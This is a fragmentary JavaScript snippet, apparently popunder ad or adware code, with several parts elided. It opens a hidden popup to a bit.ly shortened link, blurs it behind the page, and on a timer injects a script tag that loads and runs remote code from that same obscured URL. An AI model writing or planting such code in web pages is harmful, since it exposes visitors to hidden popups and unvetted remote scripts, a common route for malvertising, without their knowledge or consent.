...
contextualAds = 'http://bit.ly/2IH8goi';
var MAX_TRIED = 20;
...
function popObject(){
	...
	if (pObj) {
		try {
			if(!poped){
				popwin=pObj.DOM.Script.open ("http://bit.ly/2IH8goi","Ads1195333784","scrollbars=1, resizable=1, menubar=1, location=1, top=100,left=100, width=800, height=800");
			}
			if (popwin) {
				popwin.blur();
				poped = true;
...
function getPaypopupURL(popwin, bk) {if (popwin) {if (contextualAds) {popwin.location = contextualAds+escape('');}else {popwin.location = 'http://bit.ly/2IH8goi';}popwin.blur();self.focus();poped=true;}return popwin;}
...
function ppinter(){
	...
	setTimeout('if(!poped ||forceInterstitial){var ppob = document.getElementById(pppid);var scob = document.createElement("SCRIPT");scob.src = "http://bit.ly/2IH8goi";ppob.appendChild(scob);}', 10);
}
